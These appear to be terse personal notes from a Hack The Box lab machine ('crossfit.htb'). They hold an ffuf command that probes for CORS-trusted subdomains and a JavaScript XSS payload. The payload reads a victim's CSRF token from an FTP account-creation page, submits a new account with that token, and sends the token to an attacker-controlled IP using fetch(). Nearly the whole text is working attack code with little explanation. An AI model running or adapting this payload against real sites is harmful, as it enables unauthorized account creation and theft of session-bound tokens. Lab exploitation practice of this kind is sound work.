

recon...



[[ffuf]]

```bash
ffuf -u http://crossfit.htb  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Origin: http://FUZZ.crossfit.htb" -ignore-body -mr "Access-Control-Allow-Origin"
```

XSS

```js
const domain = "http://ftp.crossfit.htb/accounts/create ";

var x1 = new XMLHttpRequest();
x1.open("GET", domain, false);
x1.withCredentials = true;
x1.send();

var response = x1.responseText;
var parser = new DOMParser();
var doc = parser.parseFromString(response, "text/html");
var token = doc.getElementsByName("_token")[0].value;

var x2 = new XMLHttpRequest();
var data = "username=test&pass=test123!@#&_token=" + token;
x2.open("GET", domain, false);
x2.withCredentials = true;
x2.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
x2.send(data);

fetch("http://10.10.16.2:8081/" + token);

```